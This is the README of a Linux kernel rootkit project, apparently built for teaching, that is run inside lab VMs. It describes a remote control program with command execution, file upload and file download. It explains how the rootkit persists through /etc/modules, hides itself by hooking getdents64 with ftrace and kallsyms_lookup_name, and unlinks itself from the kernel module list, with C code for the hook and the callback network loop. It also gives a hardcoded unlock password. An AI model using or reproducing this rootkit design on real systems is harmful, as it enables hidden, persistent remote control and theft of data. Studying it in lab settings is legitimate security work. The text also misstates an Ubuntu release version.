# Epirootkit

some sneaky rootkit with a cool program to manage it remotely
TODO intro

## Setup

### Victim machine

#### Creating the VM

Let's begin by downloading the Ubuntu 20.04 ISO from their official archive. You can
download it with wget using the following command:

```bash
wget https://old-releases.ubuntu.com/releases/focal/ubuntu-20.04-desktop-amd64.iso
```

Then, you will need to install the Virt-Manager program, in order to easily
manage KVM guests. It is packaged on all popular distributions, and the
download instructions can be found
[here](https://virt-manager.org/download.html).


Your computer will also need to have virtualization setup, ideally with KVM.
The steps are very specific to the hardware and distributions you use.

Once ready, you can open Virt-Manager and click on the `+` button to create a
new virtual machine. Select the previously downloaded image and follow the
install wizard to complete the setup as you like. You can name the machine
anything you like, and give it as much hardware resources as you want, just
make sure it's enough to handle this very advanced rootkit.
Virt-Manager should have created a `default` virtual network for you, make sure
to select it for your VM. If there is no network available, create a new one 
(Edit > Connection Details > `+` sign) with the following settings:

- __NAT__ network type
- A valid IPV4 addressing scheme
- A valid DHCP range to assign adresses to the machines automatically

Here is an example of how the XML network configuration should look like:

```xml
<network>
  <name>default</name>
  <uuid>d575d74b-96a6-4109-b371-ced1457d92e9</uuid>
  <forward mode="nat">
    <nat>
      <port start="1024" end="65535"/>
    </nat>
  </forward>
  <bridge name="virbr0" stp="on" delay="0"/>
  <mac address="52:54:00:c9:d9:0c"/>
  <ip address="192.168.122.1" netmask="255.255.255.0">
    <dhcp>
      <range start="192.168.122.2" end="192.168.122.254"/>
    </dhcp>
  </ip>
</network>
```

In case you need more details you can refer to [the RedHat
website](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/virtualization_deployment_and_administration_guide/sect-managing_guest_virtual_machines_with_virsh-managing_virtual_networks)
, or the [libvirt wiki](https://wiki.libvirt.org/VirtualNetworking.html) to get
setup. Keep in mind that the default should be all you need.


#### Installing Ubuntu

Start the VM and click the `Install Ubuntu` button. Choose a language and keyboard layout,
and make sure to untick the `Download updates while installing ubuntu` option on step 4. 
A minimal install is enough and will save you space and time.

![Ubuntu install step 4](./img/installvictim_1.png) 

Follow the rest of the wizard. This guide will assume you machine's hostname is
`victim` and the user is named `user`, but you can use whatever.

#### Installing packages, kernel and rootkit

Once the install is finished, reboot the machine, and get this repository.
There are various ways do to so:
- Set up a mountpoint between your host machine and the VM
- Generate an SSH key on the VM, and add it to your Forge profile so you can clone it
- Share your local folder with `scp`

I will demonstrate the last option here as it is very straightforward. First, click the
blue "info" button on the top bar of your Virt-Manager window, navigate to the "NIC"
tab, and take note of the "IP address" field (or use the `ip a` command).

![vm's ip address](./img/2025-06-14-191539_hyprshot.png) 

Open a terminal in the VM and install SSH with the following command:

```bash
sudo apt install ssh
```

Make sure it's running with:

```bash
sudo systemctl status ssh
```

Then, use the following command to copy your local repository to the VM, making
sure to replace the local path, victim user name and IP by their actual values
(here i use `./epirootkit`, `user` and `192.168.122.29`)

```bash
scp -r ./epirootkit user@192.168.122.29:/home/user/epirootkit
```

Navigate to the `rootkit` directory and run the `bootstrap.sh` to handle all
the next important steps for you:
- update package repositories
- upgrade installed packages
- install the needed development packages to compile the kernel module
- edit the Grub configuration to allow you to boot in the right kernel

The last point is important because the rootkit is made to work with a kernel
version inferior to `5.7`. The Ubuntu 24.04 LTS release initially shipped with
version `5.4.0-26`, but donwloading it today will automatically bundle a more
recent version (`5.15.0-139`). The `5.4.0-26` version is still present in the
ISO, you can verify it by running `ls /lib/modules`, so we don't have to
install anything. The script will simply set the default boot entry to the
right kernel.

After you run the script, make sure you reboot the VM in order to switch to
the correct kernel version. You can verify it with the command `uname -r`.

Next, let's build the kernel module by navigating to the `rootkit` directory.
Running `make` will produce the `epirootkit.ko` module, but you should use the
provided `insert.sh` script to handle this. Don't run it for now as we will set
the attacking machine up first.


### Attacking machine

#### Installing the VM and OS

The attacknig machine only needs to build and run a Go binary. Go is a very
small and portable language so you can use almost anything for this (Linux 3.2
or higher). Since we've already downloaded an Ubuntu ISO that fullfills all
requirements earlier, we'll just use that.

In Virt-Manager, click on the `+` button and follow the same steps as above to
create another Ubuntu VM. In case you have multiple virtual networks, make sure
to select the same one you used for the victim VM so that they can communicate

Launch the VM and follow the guided installation, once again, you'll be fine with a
minimal install.

#### Building the attacking program

When the VM is ready, you'll once again need to get the repository with the 
method of your choice. Then, navigate to the `attacking_program/cli` directory
and run the `setup.sh` script.

The script will update the repos and install the needed packages. It will then
download Go 1.24.4 from the official website, extract it and put the binary in
`/usr/local`. The script will then update the user's path and print the result
of `go version`, to assert that everything went well. A [Nerd
Font](https://www.nerdfonts.com/) will also be installed, as the CLI makes use
of various special characters and emojis.

After running the script, run `source ~/.bashrc` to update the `$PATH` of your
current shell. You can now run `make build` to build the attacking program,
which will be placed in the `bin` directory.

## Using the rootkit 

### Inserting the module

Now that both your VMs are up and running, we can use the `insert.sh` script in
the victim machine to insert the module. It will create some directories used
by the rootkit to store various data, build the module, and finally insert it
with `insmod`. Two arguments can optionally be given to it: the IP address of
the attacking machine, and the port. You'll most likely only want to provide an
IP, as the default port is set to be the same on the rootkit and the attacking
program (6667).

To find out which IP address was assigned to your attacking VM, you can use the
`ip a` command inside it, or check it in Virt-Manager. 

```bash
# Useful for netcat debugging (IP will be 127.0.0.1, port 6667):
./insert.sh

# Set only IP (port will be 6667):
./insert.sh '192.168.1.88'

# Set IP and port:
./insert.sh '192.168.1.88' '9999'
```

> [!WARNING]
> Inserting the module will make it persistent and hidden by default! To remove
> it, you'll need to connect it to the attacking program, unlock it with the 
> password, un-hide it, and then use rmmod.

Now that you've managed to insert the rootkit, you can check it's activity in
the kernel logs with `dmesg -L -T -w`.

> [!NOTE]
> Flooding the kernel logs isn't very smart for a rootkit that wants to 
> acutally go unnoticed, but being a pedagocical project, I choose to keep the
> logs enabled by default, so you can see what's going on under the hood.

### Starting the CLI

The attacking program uses a Makefile with a `build` and a `run` rule.
Simply running `make run` will start the program. If you've set the right
IP and port when inserting the rootkit on the victim machine, and your two
VMs are actually on the same network, you should notice the status in the upper
right corner changing from "LISTENING" to "CONNECTED". You can confirm it by 
checking the kernel logs of the infected machine.

Congratulations, you can now remotely control this poor Ubuntu VM while staying
_completely_ hidden!

### Using the CLI

The UI is composed of a main pane on the left, and of a secondary one on the
right. The right pane is always visible and displays the connection status as
well as a logs window. The main pane is divided in 4 tabs, the `Tab/Shift+Tab`
or `Left/Right arrow` keys can be used to navigate between them. When inserted,
the rootkit will always start out locked, and every tab will prompt you for the
password before allowing you to use their respective features. Type the
following password to unlock the rootkit:

``` thisisverysecure ```

The rootkit can be locked again in the `Hide/Lock` tab, or by rebooting the
infected machine.

All features which require network communcations with the rootkit are handled
in a non-blocking way, so you can freely browse the UI while waiting for your
task to end. A _"Loading"_ message appears on the right pane if a command is
running.

#### Exec tab

The first tab displays a pager window, and a text input field below it. Typing
a command and pressing `enter` will execute the command on the infected
machine, and display the output. The output displayed will be `stdout` if the
command was successful, or `stderr` if it failed. Both ouputs are saved to a
file in the `/rootkit` directory, with names made of the first word of the
executed command concatenated with a timestamp. The `up` and `down` arrows can
be used to scroll in the pager.

![exec tab](./img/exec_tab.png) 

#### Hide/Lock tab

The second tab controls wether the module is visible to userland
by toggling syscall hooks. You also have the option to lock the rootkit if
needed. Press the `H` key to hide or reveal the rootkit, and the `L` key to
lock it. You should see the status update accordingly.

![hide-lock tab](./img/hide_tab.png) 

#### Upload tab

This tab allows you to pick local files to send on the infected machine. You
can navigate the current directory with the `up/down` keys, and change
directories with the `escape` and `enter` keys to go back or forward.

The selected file will be saved in the `/rootkit/uploaded` directory of the 
infected machine.

#### Download tab

The last tab can be used to download files from the infected machine to the
attacking machine. Simply type a valid path and press `enter`. The file will
be saved to the current directory, and a timestamp will be appended to it's name.

## Inner workings

In this part, I'll give more detail about how both programs are structured, and
the technical choices I've made along the way.

### Rootkit

#### Network thread

The rootkit's control flow revolves around a network loop, which runs on it's
own thread, separate from the main one. This allows the main thread to react
to an eventual module removal event without hanging.

A single socket connection is established by the network thread, and is
maintained for as long as possible. If a read or write operation fails, a loop
attempting to establish a new connection will start immediatly. This unique 
connection is polled by the main loop every second, as the read operation on
the socket `kernel_recvmsg` is set to be non-blocking by the `MSG_DONTWAIT`
flag. With the default behavior, read operation will halt the program if there
are no bytes to read, until something is sent. This wasn't fitting my needs as 
the loop checks for `kernel_should_stop()`'s result in order to know when to exit,
but hanging on the socket read could delay reading this value for a very long time.
The `MSG_DONTWAIT` flag will continue the execution flow if no bytes are
available, with a special return value, which I use to `continue` the loop.

```c
while (kthread_should_stop() == 0)
{
    if (!sock)
    {
        // Conection lost: try to re-establish it every 3 seconds
        while ((r = network_init(cfg->ip, cfg->port)) != 0
            && kthread_should_stop() == 0)
        {
            msleep(3000);
        }
    }

    if (kthread_should_stop() || !sock)
    {
        break;
    }

    ret = kernel_recvmsg(sock, &resp_msg, &resp_vec, 1, 1023, MSG_DONTWAIT);
    if (ret == -EAGAIN || ret == -EWOULDBLOCK)
    {
        // No data, wait 1 second before trying again
        msleep(1000);
        continue;
    }
    if (ret < 0)
    {
        // Error happened: log it and set socket to NULL:
        NET_ERROR(status_buf)
    }
    // Process read bytes...
}
// If we end down here, the module has been removed
```

#### Commands

On a successful read, network loop will attempt to parse the data into a 
__command__. Commands map to all of the rootkit features which can be 
triggered remotely:

- execute a shell command
- set or syscall hooks to hide or reveal the rootkit to userland
- lock the rootkit
- upload a file
- download a file

They are defined in the `commands.h` file as a simple struct made of a an enum
tag, a callback function to run the command, and a string of arguments for the
command. For example, the _download_ command will need a filepath to read, or
the _exec_ command will need a shell command to try to execute.

The `cmd_build` function is responsible for doing the parsing and initializing
a `command` struct. The network loop will then attempt to run the command's
callback function after filtering the command based on the current lock state
(any command different from the unlocking one will be dropped if the rootkit is
locked). The callback takes a pointer to the socket as an argument, as every command
will need to write data to be sent to the attacking program.

#### First run and main thread flow

Let's now focus on what happens when you insert the module using the `insert.sh`
script. The directories `/rootkit`, `/rootkit/uploaded` and `/rootkit/persist` will
be created, and the kernel object will be copied to the latter location.

In the init function, the rootkit will try to make itself persistent by running the 
`persist.sh` script from userland with `call_usermodehelper`. This is because the 
tasks needed to be performed are not suited to being done from kernel land, using a
script from a root shell is way cleaner and easier. Here is a breakdown of what 
the script does in order to make the rootkit persist:

- Copy the `epirootkit.ko` kernel object to `/lib/modules/$(uname -r)/kernel/lib`
- Rebuild the module dependency tree with `depmod -a`
- Add the module's name to `/etc/modules` so it can be loaded by `kmod` on boot

Having the `epirootkit.ko` copied from the repository to `/rootkit/persist` first will
allow the script to find it in the same location on every run, no matter where you run
it from or where the repository is located on your machine.

If the script was executed successfully, the rootkit will then hook the necessary
syscalls to hide itself from userland. This is done with a call to the `setup_hooks`
function, which will be detailled in the next point.

After this, the init function starts a new kernel thread to run the network loop which
we described earlier. Everything is now setup, the main thread will idle until the 
module is removed. On removal, the exit function will simply stop the network thread
(which will respond instantly thanks to the non-blocking IO on the socket), clear the 
syscall hooks, and deallocate all resources.

#### Syscall hooks and other tricks 

To hide itself from userland, the rootkit will hook the kernel's internal
functions used by syscalls to modify the data they return. To do so, the
`ftrace` API is very useful: it allows us to track very precisely the execution
flow of the kernel, and to set callbacks to run when specific values are
contained in registers. Using this technique on the `RIP` register (the
instruction) pointer allows us to place callbacks on any kernel function we
want, if we know it's address.

But how can we know the address of a specific function? Because of _Adress
Space Layout Randomization_, we can't just look them up online and hardcode
them. Thankfully, the kernel developpers have given us the exact tool we need:
the `kallsyms_lookup_name` function. It allows us to dynamically query the address
of any symbol by it's name in the kernel's memory.

We now have everything we need to hook kernel functions. The `hook.c` file contains
helper functions to facilitate this process:

- `find_hook_addr` will query the address of the desired function, and store a
pointer to the original function, so we can directly call it in our callback
- `setup_hook` will use our previous helper along with `ftrace` to set a
callback to run when `RIP` hits the targeted function
- `remove_hook` will use `ftrace` to deactivate our callback

Thanks to these, the `setup_hooks`, `clear_hooks` and `toggle_hooks` functions 
can perform the same operations on an array of hooks. The only useful hook for 
the rootkit to stay hidden is the one on `getdents64`. This is the syscall 
responsible for getting informations about a directory entry. It is used all
over the place by programs and shell builtins who deal with the file system 
(that's a lot of programs). The strategy here is to call the original
`sys_getdents64` function from our hook, copy the returned `dirent` (a
directory entry structure containing lots of infos) to kernel memory so we can
tinker with it, then copy back our altered version to user memory, and return
it instead of the original. The tinkering consists in looping over all the 
entries in the `dirent` (they are all contiguous in memory) and checking if 
their name contains the substring `rootkit`. If so, we'll remove them from the list 
by shifting the rest of the list back by the removed entry's size.

```c
while (i < sz)
{
    // kernel_cpy is the original dirent, copied to kernel memory
    cur_entry = (void *)kernel_cpy + i;
    if (strstr(cur_entry->d_name, "rootkit") != NULL)
    {
        long remaining = spoofed_sz - (i + cur_entry->d_reclen);
        spoofed_sz -= cur_entry->d_reclen;
        pr_info("hook: masking dirent `%s`.\n", cur_entry->d_name);
        memmove(cur_entry, (void *)cur_entry + cur_entry->d_reclen,
                remaining);
        continue;
    }
    // only increment if we haven't shifted
    i += cur_entry->d_reclen;
}

if (spoofed_sz != sz)
{
    pr_info("hook: shrunk dirent buffer: %ld -> %ld bytes.\n", sz,
            spoofed_sz);
}

```

This is the loop that removes entries and shifts the list back, maintaining a 
`spoofed_sz` variable that starts out equal to the original `dirent`'s size, 
and gets decremented on every shift.

The other mecanism used along with hooks is removal from the loaded modules
list. The module list is an internal linked list used by all programs that
return informations about kernel modules on the system. For example, `lsmod`.
Fortunately for us, the kernel provides us a nice macro to get a pointer to 
our module's list node: `THIS_MODULE`. The list is a doubly-linked one, and
a function to remove a node already exists: `list_del`, thus, when setting hooks
up, we just have to store `THIS_MODULE->list.prev` in a global variable and
remove `&THIS_MODULE->list` from the modules list. And that's it, we're invisible.
To reinsert ourselves back in the list so we can use `rmmod`, the `clear_hooks`
function will add our module back to the list at the same position, thanks to 
the previous node pointer we saved to a global variable. The internal function
`list_add` takes care of it for us.

#### Kernel versions supported

The module hasn't been tested on versions other than the Ubuntu
`5.4.0-26-generic`, but should work fine on versions above `4.17.0`. Before
that, the calling convention for syscalls was different, so the hook's function
signatures would cause errors. The version `5.7.0` introduced new security
measures to prevent script kiddies from hooking syscalls too easily (it was
really easy), such as unexporting our magic key to every symbol's address:
`kallsyms_lookup_name`. Another method needs to be used to find get pointers to
the functions we wish to hook so our approach clearly won't work.

The `kallsyms` method was easier so I choose to stay under version `5.7`, but I
wanted to stay as modern as possible and decided to support the newer syscall
signatures introduced with `4.17.0`. When looking at the kernels provided by
LTS Ubuntu releases, I found that `24.04` shipped with `5.4` and decided to go
with that, as it's a very (way too much) widespread release (of a way too
popular distro).

### Attacking program

TODO
#### Technical choices 

I use Go btw

#### Bubbletea program

elm architecture blabla it's very cool

#### Concurrency and socket access

one read every tick from main thread, dumps strings in channel,
jobs wait on channel without issues, i love channel i love go
